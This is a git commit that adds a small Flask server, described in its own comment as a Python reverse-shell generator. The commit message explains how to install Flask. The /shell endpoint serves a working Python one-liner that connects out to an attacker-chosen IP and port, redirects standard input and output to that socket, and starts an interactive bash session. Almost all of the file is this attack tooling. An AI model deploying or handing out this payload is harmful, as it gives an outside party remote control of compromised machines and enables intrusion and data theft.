4bbebf817a80694eda0384c44201b25bdda08e8e
If_neccessary <235175137+ifneccessary@users.noreply.github.com>
2026-02-17 18:05:28 +0100

    Add files via upload
    requirements on api server: flask
    pip3 install flask. if not allowed, sandbox (create virtual python environment with following cmd :))
    
    python3 -m venv [name_of_directory_which_abstracts_env]
    source ./name_of_dir/bin/activate
    pip3 install flask

---
+++ main.py
@@ -0,0 +1,19 @@
+import flask,sys
+#py rev shell generator via HTTP.
+#requirements:
+#on target system python3 interpreter must be installed
+
+IP=sys.argv[1]
+PORT=sys.argv[2]
+app=flask.Flask(__name__)
+@app.route('/shell',methods=['GET'])
+def send_code():
+ s=flask.request.args.get('ip',type=str)
+ p=flask.request.args.get('port')
+ python_rev_shell=f'import socket,os,subprocess; sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM);os.dup2(sk.fileno(),0);os.dup2(sk.fileno(),1);os.dup2(sk.fileno(),2); sk.connect(("{s}",{int(p)})); subprocess.run(["/bin/bash","-i"],text=True);'
+ return python_rev_shell
+
+
+app.run(host=IP,port=PORT)
+
+
